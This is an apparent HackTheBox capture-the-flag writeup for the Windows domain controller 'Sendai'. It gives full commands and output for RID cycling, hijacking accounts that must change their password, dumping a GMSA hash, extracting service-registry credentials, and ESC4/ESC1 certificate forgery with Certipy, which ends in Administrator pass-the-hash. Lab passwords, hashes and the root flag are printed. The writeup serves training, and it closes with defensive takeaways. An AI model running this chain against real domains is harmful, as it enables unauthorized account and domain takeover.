# Sendai — HackTheBox Writeup

**Platform:** [Hack The Box](https://app.hackthebox.com/machines/Sendai)
**Difficulty:** `Medium`
**OS:** `Windows`
**Author:** samurai

---

## Overview

Sendai is a medium-difficulty Windows Active Directory machine centred on weak account hygiene, GMSA abuse, and ADCS misconfigurations. Initial access is gained by enumerating anonymous SMB shares for domain intelligence, RID-cycling to build a user list, and identifying accounts in a forced password-reset state. Resetting `thomas.powell`'s password provides a domain foothold. BloodHound analysis reveals a group membership chain that allows reading the `mgtsvc$` GMSA password, enabling WinRM access to the DC. Local enumeration of the Windows service registry exposes inline credentials for `clifford.davey`, whose `CA-OPERATORS` group membership grants `GenericAll` over a certificate template. Abusing ESC4 → ESC1 with Certipy, a certificate is forged for the `administrator` account, its NT hash is retrieved, and full domain compromise is achieved via WinRM.

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Foothold — Forced Password Reset & SMB Enumeration](#foothold)
3. [Lateral Movement — GMSA Abuse](#lateral-movement)
4. [Credential Discovery — Service Registry](#credential-discovery)
5. [Privilege Escalation — ADCS ESC4/ESC1](#privilege-escalation)

---

## Reconnaissance

Port scanning was performed using RustScan for fast discovery followed by Nmap for service and version detection.

```bash
rustscan -a 10.129.234.66
```

```
Open 10.129.234.66:53    # DNS
Open 10.129.234.66:80    # HTTP
Open 10.129.234.66:88    # Kerberos
Open 10.129.234.66:135   # MSRPC
Open 10.129.234.66:139   # NetBIOS
Open 10.129.234.66:389   # LDAP
Open 10.129.234.66:443   # HTTPS
Open 10.129.234.66:445   # SMB
Open 10.129.234.66:464   # kpasswd
Open 10.129.234.66:636   # LDAPS
Open 10.129.234.66:3268  # Global Catalog LDAP
Open 10.129.234.66:3269  # Global Catalog LDAPS
Open 10.129.234.66:3389  # RDP
Open 10.129.234.66:5985  # WinRM
Open 10.129.234.66:9389  # ADWS
```

The open port profile confirms a Windows Domain Controller. The domain is `sendai.vl` and the target hostname is `dc.sendai.vl`.

### Open Ports Summary

| Port | Protocol | Service | Notes |
|------|----------|---------|-------|
| 53 | TCP | DNS | Simple DNS Plus |
| 80/443 | TCP | HTTP/HTTPS | Microsoft IIS 10.0 |
| 88 | TCP | Kerberos | Domain Controller indicator |
| 389/636 | TCP | LDAP/LDAPS | Active Directory |
| 445 | TCP | SMB | Anonymous/guest access available |
| 5985 | TCP | WinRM | Remote management — target for shell |
| 9389 | TCP | ADWS | Active Directory Web Services |

---

## Foothold

### SMB Anonymous Enumeration

Anonymous SMB access was confirmed. The `sendai` and `Users` shares were readable without credentials. Browsing the `sendai` share revealed two notable files: `incident.txt` and `security/guidelines.txt`.

`incident.txt` contained a key piece of intelligence — the IT department had expired accounts with weak passwords, requiring a password reset on next login. This strongly hints at accounts in a `STATUS_PASSWORD_MUST_CHANGE` state.

### RID Cycling — User Enumeration

With guest SMB access, RID cycling was used to enumerate domain accounts:

```bash
python3 ridenum.py 10.129.234.66 500 2000 GUEST ''
```

```
Domain Sid: S-1-5-21-3085872742-570972823-736764132

Account name: SENDAI\Administrator
Account name: SENDAI\Thomas.Powell
Account name: SENDAI\Elliot.Yates
Account name: SENDAI\Clifford.Davey
Account name: SENDAI\mgtsvc$
[... 22 total accounts ...]
```

### Identifying Forced Password Reset Accounts

The user list was tested against SMB with empty passwords to identify accounts awaiting a forced reset:

```bash
netexec smb sendai.vl -u users.txt -p '' --continue-on-success
```

Two accounts responded with `STATUS_PASSWORD_MUST_CHANGE` instead of `STATUS_LOGON_FAILURE`:

```
[-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE
[-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE
```

`STATUS_PASSWORD_MUST_CHANGE` means the old password is not required to perform a reset — any new password can be set directly.

### Password Reset — thomas.powell

```bash
impacket-changepasswd -dc-ip 10.129.234.66 -no-pass sendai.vl/Thomas.Powell:''@sendai.vl
# New password: admin1234!
```

```
[*] Password was changed successfully.
```

The same process was applied to `Elliot.Yates` (new password: `admin1234!`).

### Hidden SQL Credentials via Config Share

With `Elliot.Yates` credentials, the `config` share was accessible:

```bash
smbclient //sendai.vl/config -U 'Elliot.Yates%admin1234!'
smb: \> get .sqlconfig
```

```
Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=SurenessBlob85;
```

A SQL service account password was discovered, though not directly needed for the main attack path.

---

## Lateral Movement

### BloodHound Analysis

BloodHound data was collected using the compromised `thomas.powell` account:

```bash
bloodhound-ce-python -u 'thomas.powell' -p 'admin1234!' -d sendai.vl \
  --zip -c All -dc dc.sendai.vl -ns 10.129.234.66
```

Marking `Thomas.Powell` and `Elliot.Yates` as owned and running **Shortest Paths from Owned Objects** revealed the following chain:

```
Thomas.Powell / Elliot.Yates
    └─► Member of SUPPORT group
            └─► SUPPORT has GenericAll over ADMSVC group
                    └─► ADMSVC members have ReadGMSAPassword over MGTSVC$
                            └─► MGTSVC$ is member of REMOTE MANAGEMENT USERS
```

### Abusing GenericAll — Adding to ADMSVC

`GenericAll` over `ADMSVC` allows adding members. `thomas.powell` was added to the group:

```bash
net rpc group addmem "admsvc" "thomas.powell" \
  -U "sendai.vl"/"thomas.powell"%'admin1234!' -S 10.129.234.66
```

```bash
net rpc group members "admsvc" -U "sendai.vl"/"thomas.powell"%'admin1234!' -S 10.129.234.66
# SENDAI\websvc
# SENDAI\Norman.Baxter
# SENDAI\Thomas.Powell  ← added
```

### Reading the GMSA Password

With group membership in place, the GMSA password for `mgtsvc$` was readable:

```bash
python3 gMSADumper.py -u 'thomas.powell' -p 'admin1234!' -d 'sendai.vl'
```

```
Users or groups who can read password for mgtsvc$:
 > admsvc
mgtsvc$:::f30c842007f4e278d504b7397a9e76e3
mgtsvc$:aes256-cts-hmac-sha1-96:212aac6e0bfc5e191c6b065f344e6abddfe75a2997ee3d2230cf93728d936c6f
```

### WinRM Access as mgtsvc$

The NTLM hash was used to authenticate via WinRM:

```bash
evil-winrm -i dc.sendai.vl -u 'mgtsvc$' -H 'f30c842007f4e278d504b7397a9e76e3'
```

```
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> type C:\user.txt
<user flag>
```

---

## Credential Discovery

### Service Registry Enumeration

With a foothold on the DC, the Windows service registry was queried to find services with hardcoded credentials in their `ImagePath`:

```powershell
dir -Path HKLM:\SYSTEM\CurrentControlSet\services | Get-ItemProperty | `
  Select-Object ImagePath | select-string -NotMatch "svchost.exe" | select-string "exe"
```

Among the results:

```
@{ImagePath=C:\WINDOWS\helpdesk.exe -u clifford.davey -p RFmoB2WplgE_3p -k netsvcs}
```

Credentials for `clifford.davey` were stored in plaintext as command-line arguments to a custom service — a critical misconfiguration, as process arguments are readable by any authenticated user.

Credentials were verified:

```bash
netexec smb dc.sendai.vl -u 'clifford.davey' -p 'RFmoB2WplgE_3p'
# [+] sendai.vl\clifford.davey:RFmoB2WplgE_3p
```

---

## Privilege Escalation

### BloodHound — CA-OPERATORS Group

`clifford.davey` is a member of `CA-OPERATORS`. BloodHound showed that `CA-OPERATORS` has `GenericAll` over the `SENDAICOMPUTER` certificate template — a textbook ESC4 condition.

```
clifford.davey
    └─► Member of CA-OPERATORS
            └─► CA-OPERATORS has GenericAll over SENDAICOMPUTER template
                    └─► ESC4 → reconfigure to ESC1 → forge cert as administrator
```

### ESC4 — Modifying the Certificate Template

> **Note (Certipy v5 syntax):** The `-save-old` flag from v4 was replaced by `-save-configuration` and `-write-default-configuration` in v5.

The template was backed up and reconfigured to ESC1 conditions (enabling arbitrary SAN specification):

```bash
certipy-ad template -u 'clifford.davey' -p 'RFmoB2WplgE_3p' \
  -dc-ip 10.129.234.66 \
  -template SENDAICOMPUTER \
  -write-default-configuration \
  -save-configuration SendaiComputer.json
```

```
[*] Wrote current configuration for 'SENDAICOMPUTER' to 'SendaiComputer.json'
[*] Successfully updated 'SendaiComputer'
```

### ESC1 — Requesting a Certificate as Administrator

> **Note:** Using `-target dc.sendai.vl` caused a NETBIOS timeout in this environment. Using the IP address directly resolved the issue.

```bash
certipy-ad req -u 'clifford.davey' -p 'RFmoB2WplgE_3p' \
  -dc-ip 10.129.234.66 \
  -target 10.129.234.66 \
  -ca 'sendai-DC-CA' \
  -template SENDAICOMPUTER \
  -upn 'administrator' \
  -sid 'S-1-5-21-3085872742-570972823-736764132-500'
```

```
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate object SID is 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Wrote certificate and private key to 'administrator.pfx'
```

### Authenticating with the Certificate — NT Hash Retrieval

```bash
certipy-ad auth -u administrator -domain sendai.vl \
  -dc-ip 10.129.234.66 -ns 10.129.234.66 \
  -pfx administrator.pfx
```

```
[*] Got TGT
[*] Got hash for 'administrator@sendai.vl': aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a
```

### Domain Admin via WinRM

```bash
evil-winrm -i sendai.vl -u administrator -H 'cfb106feec8b89a3d98e14dcbe8d087a'
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
1bc134a7b4ae19fcc072082026d991cf
```

---

## Attack Chain Summary

```
Anonymous SMB → incident.txt hints at expired accounts
    └─► RID cycling → full user list
            └─► STATUS_PASSWORD_MUST_CHANGE → reset thomas.powell & elliot.yates
                    └─► BloodHound: SUPPORT → GenericAll → ADMSVC
                            └─► Add thomas.powell to ADMSVC → ReadGMSAPassword
                                    └─► mgtsvc$ NTLM hash → WinRM foothold
                                            └─► Service registry → clifford.davey plaintext creds
                                                    └─► CA-OPERATORS GenericAll over SENDAICOMPUTER
                                                            └─► ESC4 → ESC1 → forge admin cert
                                                                    └─► NT hash → WinRM as Administrator
                                                                            └─► root.txt ✓
```

---

## Key Takeaways

- `STATUS_PASSWORD_MUST_CHANGE` accounts do not require knowledge of the old password to reset — any attacker with network access can take them over entirely.
- GMSA passwords are scoped to group membership. `GenericAll` over a group that holds `ReadGMSAPassword` is functionally equivalent to owning the service account.
- Credentials passed as command-line arguments to Windows services are stored in the registry under `HKLM\SYSTEM\CurrentControlSet\Services` and are readable by any authenticated domain user. Secrets should be stored in DPAPI-protected storage or managed credential vaults, never in `ImagePath`.
- ESC4 (`GenericAll` over a certificate template) is a direct path to ESC1. Any principal that can rewrite template attributes can enable arbitrary SAN specification and impersonate any domain account including `Administrator`.
- Certipy v5 changed the template subcommand flags: `-save-old` became `-save-configuration`, and `-write-default-configuration` replaces the implicit ESC1 rewrite. Always check `certipy-ad template -h` when moving between tool versions.
